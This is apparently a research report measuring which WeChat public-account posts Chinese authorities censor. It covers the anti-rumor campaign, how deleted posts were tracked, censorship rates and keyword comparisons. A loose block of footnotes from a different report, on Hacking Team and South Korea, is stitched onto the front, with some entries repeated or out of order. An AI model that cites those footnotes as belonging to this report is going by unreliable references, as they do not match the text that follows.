200호” on http://www.nis.go.kr/svc/community.do?method=content&cmid=11477, which matches “Seocho P.O Box 200, Seocho-dong, Seocho-gu, Seoul, Korea” on https://wikileaks.org/hackingteam/emails/emailid/441251.\n13 http://english.hani.co.kr/arti/english_edition/e_national/700356.html\n14 http://english.yonhapnews.co.kr/national/2015/07/19/43/0302000000AEN20150719001152315F.html\n15 http://www.nytimes.com/2015/07/20/world/asia/in-suicide-note-south-korea-hacking-expert-denies-domestic-spying.html?_r=0\n16 http://bigstory.ap.org/article/acd838d482254df9b7e401607bfce9a0/south-korean-spy-agency-explored-technology-hack-chat-app\n17 http://english.yonhapnews.co.kr/news/2015/08/04/0200000000AEN20150804000900315.html\n18 https://wikileaks.org/hackingteam/emails/emailid/441228\n19 https://wikileaks.org/hackingteam/emails/emailid/441228\n20 https://wikileaks.org/hackingteam/emails/emailid/440571\n21 https://wikileaks.org/hackingteam/emails/emailid/441056\n22 https://wikileaks.org/hackingteam/emails/emailid/440827\n23 https://wikileaks.org/hackingteam/emails/emailid/441309\n24 https://wikileaks.org/hackingteam/emails/emailid/440989\n25 https://wikileaks.org/hackingteam/emails/emailid/441105\n26 See “서울 서초우체국 사서함 200호” on http://www.nis.go.kr/svc/community.do?method=content&cmid=11477, which matches “Seocho P.O Box 200, Seocho-dong, Seocho-gu, Seoul, Korea” on https://wikileaks.org/hackingteam/emails/emailid/441251.\n13 http://english.hani.co.kr/arti/english_edition/e_national/700356.html\n27 http://english.hani.co.kr/arti/english_edition/e_national/700356.html\n28 See, e.g., https://wikileaks.org/hackingteam/emails/emailid/16742; https://wikileaks.org/hackingteam/emails/emailid/608816; https://wikileaks.org/hackingteam/emails/emailid/585101; https://wikileaks.org/hackingteam/emails/emailid/42977\n29 https://ht.transparencytoolkit.org/Amministrazione/01%20-%20CLIENTI/6%20-%20Offensiva/Client%20List_Renewal%20date.xlsx\n30 https://wikileaks.org/hackingteam/emails/emailid/441306\n31 https://wikileaks.org/hackingteam/emails/emailid/441293\n32 https://wikileaks.org/hackingteam/emails/emailid/440837\n33 https://wikileaks.org/hackingteam/emails/emailid/441269\n34 https://wikileaks.org/hackingteam/emails/emailid/440822\n35 https://wikileaks.org/hackingteam/emails/emailid/437543\n36 Source: “Price_1214-1[1].pdf” extracted from “Price_1214-1[1].zip” in e-mail: https://wikileaks.org/hackingteam/emails/emailid/440822.

    "text": "\n\t\t\t\tBy Jason Q. Ngi\nMedia coverage: Reuters, South China Morning Post, Washington Post, Wall Street Journal, Quartz, Tech in Asia, PC Magazine, China Economic Review, Voice of America\n\nSummary:\n\nWeChat (known as Weixin in China) is a mobile application developed by China’s Tencent. In addition to its core chat functionality, it also has a blogging feature known as the public accounts or official accounts platform (微信公众平台).\nThis platform is similar in some ways to Weibo and has recently been the target of official scrutiny.\nThis report offers the first attempt to systematically identify what is censored on this platform. We downloaded over 36,000 unique public account posts between Jun 2014-March 2015, monitoring them over time and tracking whether they were deleted from WeChat.\nNot surprisingly, sensitive keywords are found in a greater percentage of censored posts than normal (uncensored) posts. Political keywords and keywords related to corruption are particularly likely to be found in censored posts as compared to uncensored posts.\nThe data contains evidence of automatic review filters preventing posts with certain blacklisted keywords from being published. Examples include 六四 (June 4), 太子党 (princeling), and keywords relating to Falun Gong. Further analysis of larger WeChat corpuses might be performed to deduce what other keywords trigger a post to be held for further review and/or denied publication.\nA more thorough analysis of 150 censored posts reveals that rumors, speculation, and political commentary were also being censored. Censored content included posts which contained outright falsehoods, tabloid gossip, and sensationalism—a number of which appear fairly harmless. This may be a reflection of the ongoing “anti-rumor campaign” sweeping Chinese social media.\nThis report also discusses the collective power of rumors and ambiguity in censorship, issues raised by how WeChat controls information on its public accounts platform.\nThough our data indicates a lower percentage of posts were being censored compared to other research into Chinese social media censorship, we emphasize that the set of posts collected is not a random sample and a number of factors might affect the rate. This report serves as a first attempt to identify types of content being censored on WeChat’s public accounts platform, and further research will be needed to determine actual censorship rates as well as answer other open questions.\n\n\n\nIntroduction\nMuch research has been done studying the relationship between media control and authoritarian regime durability. In this report, we examine one method of online information control by the world’s most sophisticated regulator of the Internet, China. We focus on how Tencent’s WeChat (aka Weixin in China), the leading mobile chat app in the country, restricts information on its public accounts platform (微信公众平台)—a growing social media blogging alternative to Sina Weibo. After performing a systematic collection of tens of thousands of WeChat public posts, we analyze the types of content removed by WeChat on its public accounts (also known as “official accounts”) platform. Overall, this collection of deleted posts serves as another set of data points in the ongoing goal to explicate the motives behind online censorship in China.\nThough our data indicates a lower percentage of posts were being censored compared to other research into Chinese social media censorship, we emphasize that the set of posts collected is not a random sample and there are challenges with comparing our results to other studies. With that caveat in mind, despite this limitation, we are still able to capture a sizable number of censored posts and perform analysis on them. In our set of censored posts, in addition to the categories of posts past researchers have identified as targeted for censorship on Chinese social media (particularly articles related to collective action, censorship, and pornography), we find numerous posts which relate to government policies and news—with particular emphasis on corruption—categories which King, Pan and Roberts found not to be substantially censored across various Chinese social media platforms.1 This finding may be an indication of WeChat’s exceptionalism, reflective of a shift in official censorship mandates, or other reasons, including strong automatic review filtering mechanisms preventing certain types of content from being published in the first place.\nFurthermore, among the commonly deleted posts are numerous ones that can be categorized as rumors, fake news, and superstitions. Compared to collective action events, violent threats, pornography, or criticism of the Communist Party of China (examples of which are also among the deleted posts), one might assume these kinds of rumors—some of which seem silly and harmless relative to other kinds of sensitive content—would be of lower priority for censorship. However, when considered in the context of the ongoing “anti-rumor campaign” as well as past movements to suppress rumors in recent Chinese history, the apparent emphasis on restricting rumors and political news—as suggested by their significant representation in the dataset—makes more sense. This report will outline the recent history of this online campaign and connect their justifications to related discourse on the presumed credibility gap in Chinese media as for why rumors might be seen as such a threat to Chinese authorities. It is useful to view China’s modern attempts to control information through the lens of history, and online rumors can be viewed as a kind of social protest by citizens skeptical of official news and the censorship of more independent sources of media. It is in this way that one can gain a deeper understanding for why censorship of political information from unofficial sources appears to be so prevalent on WeChat’s public accounts platform.\n\nThe Evolving Chinese Social Media Landscape\nAuthoritarian regimes have been ambivalent about Internet technology and have reacted with varying degrees of sophistication to shaping online public opinion.2 On the one hand, regimes—particularly of the one-party kind—with a long experience of managing the media through well-institutionalized “departments of propaganda” have recognized that the web can be a source of regime legitimation,3 provided that they deploy sufficient efforts to sanitize its contents while offering a range of appealing online activities4 or media content5 to their population. On the other hand, the corrosive political impact of uncontrolled and decentralized information is evident when web-activism turns into a social movement or helps diffuse information to the population.6 7 When confronted with major political challenges, autocrats have gone so far as shutting down all Internet services, as in Egypt during the demonstrations leading to the downfall of the Mubarak regime, or in Xinjiang when the regional authorities shut both the Internet and cellular phone service for months after ethnic riots in Urumqi erupted in July 2009. More targeted responses by authorities in China include building the so-called Great Firewall to deny mainland users access to certain foreign websites,8 9 supporting “50 Cent Party” members to post pro-China online comments,10 and detaining online bloggers,11 among others.\nSocial media has similarly become a battleground for Chinese officials, who seek to ensure certain content are not widely disseminated. Though a 2010 State Council Information Office white paper on Internet usage for the country asserts that Chinese users have the right to freedom of expression online, it also enumerates a prohibition against Internet information that is:\nendangering state security, divulging state secrets, subverting state power and jeopardizing national unification; damaging state honor and interests; instigating ethnic hatred or discrimination and jeopardizing ethnic unity; jeopardizing state religious policy, propagating heretical or superstitious ideas; spreading rumors, disrupting social order and stability; disseminating obscenity, pornography, gambling, violence, brutality and terror or abetting crime; humiliating or slandering others, trespassing on the lawful rights and interests of others; and other contents forbidden by laws and administrative regulations.12\nThe Wenzhou train crash in July 2011 affirmed the influence of Sina Weibo as a serious source of counter-power13 to government officials and the state media; since then Sina Weibo has been one of the most prominent social media platforms in China. But despite (or because of) its astronomical growth, like other Chinese online content providers, it also struggled with abiding by such vague rules as outlined in the 2010 white paper (in addition to more specific directives14) while at the same time ensuring a steady stream of interesting fodder for users to share, click, and comment—without whose engagement and loyalty the site would languish. Weibo oftentimes walked a fine line between these two competing objectives. As the Bo Xilai affair escalated in February and into March 2012,15 rumors of an impending coup broke out across the site, dominating political conversations for weeks16 despite varying degrees of censorship.17 18 19 Six people were detained for “fabricating or disseminating online rumors” about the coup,20 and at month’s end, the State Internet Information Office (SIIO), one of the agencies tasked with regulating Internet affairs, announced that the site would be “criticized and punished accordingly.”21 Both Tencent and Sina’s microblogging services had their commenting features suspended for three days, with both companies admitting their sites had been overrun with rumors and in need of a clean-up.22\nWeibo was confronted with another major controversy in January 2013 when the newspaper Southern Weekend’s annual New Year’s editorial was censored and re-written by Guangdong’s provincial propaganda chief. Though many media entities, including Sina’s news portal and Weibo itself, expressed coded support for the embattled magazine,23 Weibo became the target of vitriol after it began to censor posts and search keywords related to the Southern Weekend story. In response, a manager at Sina Weibo vented publicly in a post that Weibo had “tried to resist and let the messages spread” but he also acknowledged that the company had learned from the Bo Xilai affair that they could not let things get too out of control.24\nThe ability for Weibo to play both sides while also maintaining its top position in the Chinese social media landscape would not hold for long; by the summer of 2013, it soon became clear that a new gust of wind had blown Weibo’s balancing act off-center. In hindsight, the seeds for the summer crackdown on bloggers and Internet activists, particularly those who utilized Weibo, began in February, when Lu Wei, head of the SIIO (now also known as the Cyberspace Administration of China), invited a number of celebrity bloggers (known as Big Vs for the verified icon next to their names on Weibo) to dinner, and according to the Wall Street Journal, pressed them in subsequent meetings on the need to quell online rumors.25 Lu was quoted in Xinhua urging celebrities to be “more positive and constructive” in their writing,26 and these recommendations were formalized in August 2013 in the so-called “Seven Baselines,” which establish guidelines of conduct for online celebrities.27\nAlso in August, notable finance blogger Charles Xue, who had a following of 12 million Weibo fans who read his posts about stock tips and inequality in the economy, had been arrested and forced to confess to various crimes. He admitted, “In the beginning, I verified every post; but later on, I no longer did that. . . First of all, I didn’t double-check my facts. Secondly, I didn’t raise constructive suggestions to solve the problem. Instead, I just simply spread these ideas emotionally.”28 Hundreds were suspected to have been similarly detained—activist Wen Yunchao documented over 50 specific incidents29—and a chilling effect was felt on Weibo, with analytics firm Weiboreach reporting a 20% drop in monthly posts by Big Vs between January to August 2013.30 31 Numerous commentators also cited anecdotal evidence confirming the diminishment of the types of more sensitive discussions that Big Vs were once willing to be the center of on Weibo. Charles Custer tied these trends together, writing in February 2014,\nWeibo, like any social service really, is driven in part by power users. . . These accounts were responsible for passing along a lot of the news that made Weibo so interesting, but the crackdown on rumors has made the passing-along of news (even news that has nothing to do with politics) seem dangerous unless it comes from an official source. So, it seems, many of these users have just stopped passing the interesting-but-unofficial news and information they find along to their followers. And that, in turn, made Weibo more boring. [. . .] For the average user, it doesn’t have anything to do with politics or political engagement; the issue is just that the most interesting users are coming online less often, and making fewer posts when they do come online.32\nCuster goes on to echo another point that other China social media watchers had been making: a growing number of disaffected and/or bored Weibo users were gradually drifting away from Weibo as their primary social media platform to WeChat. Custer argues persuasively that it was not solely a case of WeChat poaching users nor one of censorship driving users to take up WeChat’s seemingly less censored platform (though encumbered by structural restrictions as discussed in the next section), but rather a combination of the two in concert with the attack on Big Vs, which caused Weibo to be a less dynamic and interesting place for news and discussion. Thus, in some ways, WeChat was the early beneficiary of the anti-rumor campaign’s rough handling of Weibo.\nThroughout 2012 and 2013, as Weibo continued to be hammered by editorials and official statements arguing that it do more to eliminate rumors and other illegal content from the service, WeChat appeared to escape similar public levels of scrutiny. Weibo was forced to continue sanitizing their site both through technical means—blocking keywords, deleting posts, and implementing mechanisms that would automatically hold posts for review if they included certain keywords, among others33—as well as through punitive measures—developing new site rules, including a much-derided points system that would punish users for posting objectionable content.34 In May 2013, the SIIO issued a statement that rumormongers on microblogging sites would be targeted and reminded social media users that users could be jailed for spreading rumors that incited subversion against state power, affected the securities market, concerned terrorist activities, or were directed at smearing business reputations or products.35 36 The detention of hundreds of Weibo users for illegal distribution of content in recent years as well as the announcement of even tighter regulations in Sept 2013 criminalizing actions on microblogs like simply retweeting false information,37 combined with the corresponding lack of systematic censorship in WeChat’s core functionality, made the new service stand out as a seeming safe haven despite anecdotal security concerns.38\nThough Weibo is still an important online space, its prominence in the Chinese social media landscape has lessened, and WeChat today is the primary communications application for many Chinese Internet users, particularly as more and more users spend their time online from mobile phones.\nWeChat and Public Accounts as a Weibo Replacement\nWeChat is sometimes described as a chat and SMS replacement, akin to Whatsapp. However, while the core functionality of the application is indeed sending short messages to friends by mobile phone over the Internet through the app (thus avoiding any charges for sending text messages over their carrier’s cellular network), Tencent has seamlessly bundled numerous features into what is no longer just a chat application and is in fact a full-fledged social network and social media service. Users can make payments, post photos on a personal blog, download games and stickers, connect with strangers, and hail taxis all from within the app. Competitors in this all-in-one chat app space include LINE and KakaoTalk, which are popular in Japan and Korea, respectively, and are aggressively building out international user bases.\nBy the second quarter of 2014, Tencent reported that WeChat had 438 million monthly active users while Weibo was at 157 million monthly active users.39 Though documented censorship does and has occurred in WeChat (outlined in the next section), there was speculation that WeChat’s core functionality of chatting among small groups made it a fundamentally easier space to manage for nervous government officials, especially when compared with Weibo’s much wider reach, where a single user’s message could ricochet unpredictably across the platform tens of thousands of times in minutes. Chatting within small groups on WeChat meant that users were voluntarily limiting their audience by simply using the product as intended, essentially siloing information amongst limited, disconnected networks. Whether government officials intentionally set out to attack Weibo to push users to the less viral-enabling WeChat or whether this was an unintended consequence is unclear, but intention aside, the net result was a boon to regulators and policy makers who were concerned about Weibo’s role in facilitating nationwide conversations and organizing capacities.\nHowever, WeChat recognized that brands and corporations would continue to desire the ability to reach out to large audiences regardless of the platform. To enable marketers to engage masses of users in a more effective manner, WeChat introduced their public accounts platform (微信公众平台) in 2012. Also known later on as “official accounts,” this new feature would allow both individual users and companies to publish articles in the form of blog posts and push them to interested users who subscribed to their account, in addition to a number of other features designed to foster engagement between users and publishers.40 Foreign companies were also encouraged to join an international official account platform, where they could also use WeChat to engage users with updates and deals.ii\nDespite the numerous impediments to registering an account—a user must fill out an application and submit a picture of themselves holding up their Chinese identification card, for instance—by November 2013, there were 2 million registered public accounts,41 by August 2014, that number had more than doubled to 5.8 million,42 and by the end of 2014 the number of accounts reached over 8 million.43\nSome of these accounts have hundreds of thousands of subscribers—all the more remarkable considering that WeChat does little to promote public accounts within the app nor does it provide a directory of accounts. In order to view posts from a public account, a user must have access to either a QR code that links to the desired public account or the username of the public account. There is no search feature within WeChat to look up, for instance, environmental activism accounts. Popular accounts are often spread through word of mouth, breeding a certain kind of exclusivity.44 The self-selective nature of the audience plus the lack of a public comments feature (though readers can message the author privately) also eliminates much of the off-topic chatter and harassment that drove some Weibo users with large followings away from the service.45\nWhile well-known brands and companies like Starbucks and Nike did build strong official account followings,46 much of the media and public attention was directed toward accounts registered and run by individuals or small, independent media startups. In fact, the stream of articles and information published by these non-corporate entities came to be known as a new form of “self media” (自媒体, also translated as “We-Media”47), offering “more in-depth material and more diverse viewpoints” than traditional media.48 These grassroots media organizations and citizen journalists (or if not journalists, then news aggregators) flourished on WeChat throughout the app’s early years, with the platform considered much more open and uncensored than traditional media or even the more established Weibo. Media scholar Hu Yong writes:\nBlogging reached its peak in China during 2005 and 2006, but in those days there was no high-minded talk of “grassroots media.” However, the blogging craze turned us into a nation of writers, and then, when Weibo arrived on the scene, we went from a nation of writers to a nation of one-person news outlets. Everyone loved Weibo—both ordinary folks and the élite—and it took the whole country by storm. But even when Weibo was at its liveliest nobody was talking about the idea of grassroots media.\nThe grassroots media sensation really took off with the advent of mobile web technology, which introduced new ways of producing and disseminating content. It reached its culmination in WeChat, whose public accounts, introduced on August 23, 2012, allowed individuals and organizations to create mass postings of text, pictures, recordings, and later video. This turned WeChat from a private communication tool into a media platform. At the same time, because users could form circles, WeChat had the potential to become a tool for social organization—much more so than Weibo had been.49\nIn essence, WeChat had created a platform that mirrored some of the characteristics of Weibo that government officials feared the most. Whereas WeChat’s original chatting feature might have pushed users into small, disconnected groups, its public accounts platform empowered users to reach mass audiences, who could quickly and easily share the posts to friends or copy links to the posts (Figure 1)—links which could then be spread outside the app and across the general Internet. Thus, it is not surprising that of all the popular features within WeChat, it is the public accounts platform that has faced the tightest oversight and content restrictions.\n\nDocumented Cases and Evidence of WeChat Restrictions\nSince WeChat’s release in January 2011, it has been assumed by users and security analysts alike that WeChat—like any Chinese social media service that hopes to survive, particularly one released by a corporate giant like Tencent—performs some level of censorship and surveillance in the application. There have been a number of anecdotal cases of surveillance and censorship within the chat app which have been publicized (see Appendix: “Documented Cases of WeChat Restrictions”).\nGreater public attention to keyword censorship on WeChat came in January 2013, during the Southern Weekend controversy, when technology blog Tech in Asia reported the keyword “南方周末” (Southern Weekend) was being blocked in chat messages. The Next Web confirmed they received a similar error message indicating their message was blocked when they tried “法轮功” (Falun Gong). These reports were significant because the blocking affected international users. Following these reports Tencent released a statement claiming that “a small number of WeChat international users were not able to send certain messages due to a technical glitch.”\nKeyword filtering and surveillance can be implemented on the client-side (i.e., on the application itself) or on the server side (i.e., on a remote server). Client-side implementations can be analyzed through reverse engineering the application and extracting the keyword lists used to trigger censorship or surveillance. Server side implementations do not allow for the same methods and typically need to be analyzed through sample testing in which researchers develop a set of content suspected to be blocked by a platform, send the sample to the platform, and record the results.50\nAnalysis done by Jeffrey Knockel and the Citizen Lab reveal that WeChat performs keyword filtering on the server side.\nIn May 2013, Jeffrey Knockel, while in China, ran an experiment with WeChat clients registered to US phone numbers and found keyword censorship of “法轮功” (Falun Gong) but not for “南方周末” (Southern Weekend) (Figure A, left). Running this same experiment from the US with the same accounts resulted in no censorship for the same keyword. These results suggest that at that time the user’s network vantage point enabled the keyword filtering features.\nIn December 2013, the Citizen Lab conducted tests of keyword filtering on WeChat using an account registered to mainland China phone number. The analysis confirmed the keyword “法轮功” (Falun Gong) was being filtered, but “南方周末” (Southern Weekend) was not (see Figure A, right). In later tests in January 2014, we were unable to reproduce the blocking of “法轮功”. In subsequent tests in January and February 2014, we tested samples of keywords derived from previously extracted keyword lists. These tests did not find any further evidence of keyword filtering. We attempted to reproduce the previous finding from Knockel but were neither able to trigger censorship by using a VPN based in China nor by spoofing GPS locations in China. These results suggest that accounts registered to mainland China phone numbers enabled the keyword filtering features. These results are inconclusive and further analysis is needed to evaluate if keyword filtering is currently active on WeChat and how the feature is enabled. However, even if keyword filtering in the chat feature is not currently active, these results show that the capability has already been developed for the app.\nFigure A: Evidence of censorship in WeChat’s chat feature. Left: May 2013, WeChat client using an account registered to a US phone number running from a Chinese network. Right: Dec 2013, WeChat client using an account registered to mainland China phone number running from a Canadian network.\n\nPrevious research by Villeneuve51 and Knockel et al. on TOM-Skype (the Chinese version of Skype until 2013)52 revealed that TOM-Skype conducted keyword censorship and surveillance. This finding suggests that if TOM-Skype has chat message surveillance then other more popular chat programs in the Chinese market may also be under pressure to have similar controls. However, technically determining if surveillance features are present in WeChat is challenging. The Citizen Lab verified that keyword filtering is done on the server side and did not find any evidence of client side filtering or surveillance on WeChat. Therefore, if surveillance is present on the application it is likely being performed by a remote server and its effects are not visible outside that server.\nBeyond content restrictions on the chat features of WeChat are controls enacted on the public platform. As discussed in the previous section, the public accounts platform would be more likely to be viewed as a threat by authorities, and as such makes sense for it to be more tightly controlled—particularly in the last year as registration numbers for the public accounts platform have grown dramatically\nThough much was made of the suspension of dozens of public accounts in March 2014 and January 2015, how WeChat was already censoring these public accounts has been mostly overlooked. In fact, public posts on WeChat were already subject to an ambiguous form of content regulation that appeared intentionally designed to misperceive its users. Users who frequently browse through public accounts have likely encountered the error message “This content has been reported by multiple people, and the related content is unable to be shown” (此内容被多人举报，相关的内容无法进行查看), particularly when attempting to access sensitive content (Figure 2). In the next section, we discuss this form of content restriction in greater depth.\n\nIdentifying Deleted Public Posts and Censorship Rate\nIn order to identify and collect posts published by public accounts that were deleted on WeChat, we sought to collect WeChat posts at scale, then return to those posts periodically to check if they had been removed from the site. In essence, we sought to perform a task similar to Weibo censorship-tracking projects like the University of Hong Kong’s Weiboscope and GreatFire.org’s FreeWeibo. Collecting the posts at scale proved to be a challenge and a number of methods were considered before settling on an approach. (These are discussed in detail in Appendix: “Method for Identifying Deleted Public Posts and Limitations.”)\nThough data collection for this project is ongoing, this report examines the first nine months’ worth of data collected, beginning from July 2014 through the end of March 2015. During this period, we were able to download and monitor over 36,000 unique posts. These 36,000 posts came from 10,254 unique public accounts. A Compact Language Detector test successfully categorized 96.6% of the posts by analyzing each article’s text. Of those reliably categorized, 96.5% were detected as Chinese Simplified, 1.94% as Chinese Traditional, and 0.73% as Arabic/Urdu.iii\nWe also check whether a user’s account is still active or if it has been suspended; of those 10,254 accounts, 154 (1.48%) had been identified as suspended as of April 10, 2015.iv Of the 23 user accounts China Digital Times suggested we specifically monitor, 19 are still active as of April 2015 while the other 4 have been suspended. Of those 23 accounts, the most prolific is the account for 大家, an official Tencent QQ blog, which has posted 3668 posts to their public account. Their posts regularly garner tens of thousands of views and hundreds of “likes” (Figure 3).\nDuring each test, the posts being checked are categorized as having one of the three following states: normal/published (meaning the post was successfully loaded with no error messages), self-deleted (Figure 5: “This content has been removed by the publisher”), or deleted by WeChat (Figure 2: “This content has been reported by multiple people, and the related content is unable to be shown,”)—the latter being an explicit admission that the post was restricted and what most would consider censorship (more on this in “The Ambiguity of Censorship Messages” section).\nThese system-deleted posts—which for convenience we will refer to as censored posts—are on the whole slightly longer than normal or self-deleted posts (a mean of 2,642 and median of 1,883 characters long versus 2,168 and 1,478 for normal posts and 2,135 and 1,407 for self-deleted posts). Mean and median image counts were roughly the same between the three categories. While zero is the mode for number of images in a post, the majority of posts do have at least one—with the most decorated post in our sample featuring 439 images.\n2.24% of the total posts were self-deleted. An examination of the contents in these posts showed a range of varying degrees of sensitivity. For instance, numerous prosaic posts of non-sensitive material returned this message, for instance, “2015 holiday schedule has come, quickly bookmark it!” (2015年放假时间表来了，赶紧收藏呀~), but others, including posts about Taiwan, the Communist Party, and banned online videos, were also reported as self-deleted. However, it is reasonable to assume that users who published sensitive articles would also be self-aware enough to delete them if circumstances encouraged them to—either a change of heart, a reaction to new online directive against certain content, a message from an authority, etc.—and thus it is not too surprising that some sensitive content is listed as self-deleted. For example, 看中国, an overseas Chinese-language account which re-posts content which is often very critical of Chinese politics, had 42 self-deleted posts among the 717 posts of theirs that we checked. By contrast, of the 655 posts we checked from 大家’s account, which primarily posted non-sensitive content, no posts were identified as self-deleted. Indeed, the number of self-deletions for non-suspended accounts is significantly predicted by the number of censored posts the account made after number of posts is controlled for.\nChinese social media have been known for fostering an ambiguity in the error messages provided to users, with censorship often being couched in much more innocent or vague messages.53 But despite some curious coincidences, including, for instance, how a number of posts with the same content from different authors were listed as self-deleted, we will set these self-deletions aside and focus on the posts which return the censored message.\nOf the total posts checked, 3.97% were censored. However, calculating a true censorship rate for published posts on WeChat’s public accounts platform as a whole relies on having a random, representative sample of posts across the platform, which this study does not. As detailed in the “Method” section of the Appendix, we captured article links that had been publicly posted on social media in addition to posts from accounts known to share sensitive content. Users who are better self-promoters or are more well-known—and thus more likely to have links to their articles publicly posted—would undoubtedly make up a greater percentage of the sample than what should be expected. Furthermore, we also tracked 48 individual accounts of users who were known to post sensitive content, downloading their posts as they came in. Thus, certain users were overrepresented in our sample.\nFurthermore, to more accurately gauge the level of censorship in our sample, we can differentiate between whether or not a censored post was itself specifically targeted for censorship or whether it just so happened to be one of the many posts that are no longer accessible from that user because their account was suspended. This is an issue because a censored post from an active user and all posts from a suspended user return the same exact censorship message in Figure 2. About 40% of the deletions (1.55% of the total sample) were definitively identified as being deleted while the author’s account was still active, meaning the content of the post itself was flagged for deletion. The other 60% of deletions were detected as having come from users whose accounts had been suspended. While it is possible that some of the content in these posts from suspended users would also have been targeted for censorship and have in fact triggered the account suspension of the user, we cannot be certain of this and thus, we can only claim at best that these latter deletions are representative of the type of content that will get a user suspended on WeChat, whereas the former deletions do represent specific sensitive content considered worthy of deletion according to WeChat. Again, one should keep in mind though, that this does not necessarily reflect the true censorship rates of WeChat on the whole as the sample is biased. In fact, one could make the argument that the true censorship rate of all posts on WeChat’s public platform could be even lower, since as described in more detail in the “Method” section of the Appendix, the sample came from users who would be more likely to share sensitive content (e.g. people who have the technical skills and the desire to cross the Great Firewall in addition to the sensitive users we track directly); or it could be higher since we do not capture posts in real time.\n4.99% of user accounts in our sample had a post that was censored. Of the user accounts that only had one post captured in our sample, 3.5% of them were censored. Using a sample made up of one post randomly selected from each of the 10,254 individual user accounts, 3.51% of posts were censored. These measures are all different attempts to mitigate the effect that prolific users and suspended users would have on overly biasing the censorship rate.\n\n\n\n\nVarious censorship measures for our sample of WeChat public account posts\n\n\nUser accounts suspended\n1.48%\n\n\nPosts censored while user’s account was known to be active\n1.55%\n\n\nSelf-deleted posts\n2.24%\n\n\nPosts censored, all\n3.97%\n\n\nUser accounts that had at least one post censored\n4.99%\n\n\nPosts censored, only users who published one post\n3.5%\n\n\nPosts censored, one post per user account\n3.51%\n\n\n\nThough this report does not offer a true censorship rate for WeChat’s public accounts platform, the admittedly non-random sample of posts we collected does appear to suggest less censorship than what other researchers have observed on Weibo. Excluding re-posts and only looking at original messages, Bamman, O’Connor, and Smith reported 16.25% of a random Weibo sample was censored,54 while Zhu et al. calculated one of 12.8% when using a sample they hypothesized would produce a censorship rate higher than actual.55 Analyzing a wide array of non-Weibo social media posts in 2012, King, Pan, and Roberts reported a censorship rate of 13%.56 Though Fu et al. note the difficulties in calculating a true censorship rate with their extensive dataset of Weibo posts,57 Cairns and Carlson use a host of techniques to adjust and correct for such possible issues, putting the true censorship rate of Weibo within a comparable range to what others have calculated; and similar to King, Pan, and Roberts, Cairns and Carlson showed censorship on Weibo to be at a much higher, elevated rate during particularly sensitive events which elicit “volume bursts.”58 The numbers reported in these studies compared to the ones above for WeChat would fit with anecdotal reports that WeChat’s public accounts platform is less restrictive than Weibo’s with regards to censorship after publication.\nHowever, as we do not capture our posts in real-time (71% of our dataset was captured only after a link to the WeChat post was shared on other social media), we would miss posts which are censored immediately after publication (or at least before they are shared). And as Zhu et al. note, 30% of the censored posts they collected were deleted within the first 30 minutes. Furthermore, a firsthand study by Liu and Zhu of The Carter Center noted how automated filters often kept sensitive content from being actually published in the first place—and thus lessen the amount of content in need of censorship after. As they recounted, “Several times we attempted to post the article, but were repeatedly informed that its content had something sensitive that needed to be revised or deleted.”59 Either of these factors might cause us to understate the level of censorship actually experienced on WeChat’s public accounts platform. We thus offer a strong caveat about generalizing too much from our dataset about the censorship rate on WeChat as that was not the primary objective of this report but rather the intention was to identify what kinds of content might be censored on the platform.\n\nAnalysis of Content in Deleted Posts\nThe censored posts we captured are content rich and typically written in a more conventional style, allowing for both enhanced manual and machine reading compared to much shorter Weibo posts, which are often filled with abbreviations, slang, neologisms, and coded keywords to combat censorship and the 140 character limits. Some of the posts are original content while others are re-posted material from other blogs and forums. We performed some general searches through the posts as well as a more in-depth reading and categorizing of 150 censored posts.\nKing, Pan, and Roberts note that collective action is specifically targeted by online censors on numerous social media in China. And indeed, a greater share of censored posts contain words related to protest than normal posts do. For instance, “抗议” appears in the text of 5.7% of the censored posts whereas it appears in only 1.83% of normal posts. By contrast, neutral words like 朋友 (friend), 的 (of), and Germany (德国) are found in roughly the same share of censored posts as normal posts as expected. However, while the share of posts containing 抗议 is larger in the censored posts, there are still a substantial number of posts containing the word that are not censored . A closer examination reveals that many of these uncensored posts concern protests or discussions about protests taking place overseas. However, this rule is not ironclad; for example, a post about Hong Kong youths protesting and attacking mainland shoppers at a mall in February 2015 (“香港又要闹事？公然叫嚣：蝗虫们，滚回大陆 ! “) is still uncensored to date. More rigorous analysis is needed to tease out any significant correlations that might help reveal more nuanced coding rules for what gets banned and what does not.\nWe performed a similar test of various sensitive and non-sensitive keywords—the top 1000 most frequent Chinese words,60 over 9,000 keywords from 13 censorship lists,61 and 36 other select keywords—comparing what share of published versus censored posts they were found in. As shown in Table 1, as expected, many sensitive keywords are found in a greater percentage of censored posts than normal posts, some to an extreme degree. For instance, the disgraced politician Bo Xilai (薄熙来) appears in only 0.2% of normal posts, but is found in 3.91% of censored posts, a ratio of nearly 20 times greater in censored posts than in normal posts. Other politicians’ names also score extremely high on this measure, including Hu Yaobang, Zhou Yongkang, Xu Caihou, and Hu Jintao. Numerous political terms also populate this list, including harmonious society (和谐社会), the Central Political and Legal Affairs Commission (政法委) and Communist Party (共产党). As a preliminary check against users with more posts skewing these findings, we also re-ran the calculations using a sample of posts made up of one post per user. Though there were differences in some keywords, on the whole, the two sets were mostly similar.v\nOf particular note is that keywords relating to corruption (贪官, 贪污, 贪腐, 腐败, 公款) make up five of the top 50 most sensitive keywords according to this metric (after filtering out redundant keywords as well as those which were not found in less than 2.5% of censored posts), appearing in more than six times as many censored posts than would be expected based on their share of normal posts. While it is possible this is due to the fact that these keywords are less likely to be used in a neutral fashion than some of the other keywords, it may also be due to the fact that posts related to corruption are being watched particularly carefully by censors today or on WeChat.\nFurthermore, these results offer evidence of the automated review filters that prevented Liu and Zhu from being able to publish posts containing sensitive keywords. Looking at commonly censored keywords in these tables, we notice that a few had an uncommonly low presence in both normal and censored posts, indicating that posts containing those keywords were not allowed to be published. For instance, “六四” (64) is a common reference to June 4, 1989—the date of the crackdown on student protesters in Tiananmen Square. It was found in only 14 of the 33,934 normal posts and—even more surprisingly—in only one censored post. By comparison, another sensitive number, 八九 (89 for 1989), appeared in 426 normal posts and 9 censored ones, indicating that posts containing it were more likely to reach publication than 六四. 六四 is not the only common sensitive keyword however in its surprising scarcity amongst published and censored articles: princeling (太子党), a derogatory reference to the children of high government officials, appears in only 11 normal posts and 1 censored post, while numerous words related to the Falun Gong (法轮功, 九评, 李洪志) do not appear at all in either set of posts. Other sensitive words that are also suspiciously underrepresented in these WeChat posts could be tested on WeChat’s platform to confirm their presence on a blacklist, but due to a number of reasons—a user is only allowed a limited number of posts per day; it is very difficult to register one account let alone multiple accounts; there is a delay between the time a user submits a post and when they are notified that it contains sensitive content—it is currently difficult to do this at scale. Further analysis of under-represented words in 